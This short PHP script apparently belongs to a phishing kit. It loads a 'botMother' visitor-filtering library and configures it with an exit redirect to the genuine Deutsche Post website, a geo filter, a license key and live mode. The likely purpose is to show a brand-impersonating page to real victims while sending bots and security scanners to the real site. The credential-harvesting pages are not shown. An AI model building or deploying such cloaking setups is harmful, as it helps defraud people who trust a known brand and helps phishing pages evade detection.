<?php 
require (__DIR__).'/settings.php';
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.deutschepost.de/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);
$bm->run();
 

?>